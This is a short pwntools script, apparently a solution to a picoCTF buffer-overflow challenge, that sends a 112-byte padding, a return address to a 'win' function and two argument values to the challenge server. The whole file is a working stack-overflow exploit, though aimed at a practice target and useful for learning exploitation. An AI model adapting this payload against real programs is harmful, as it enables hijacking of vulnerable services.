from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

script = \
'''
b *main
c
'''

# r = process('./vuln')
# gdb.attach(r, gdbscript=script)

HOST, PORT = "saturn.picoctf.net 49182".split()
r = remote(HOST, PORT)

r.recvuntil(b'string: ')
win_addr = 0x8049296
r.sendline(b'A' * 112 + p32(win_addr) + b'AAAA' + p32(0xCAFEF00D) + p32(0xF00DF00D))

r.interactive()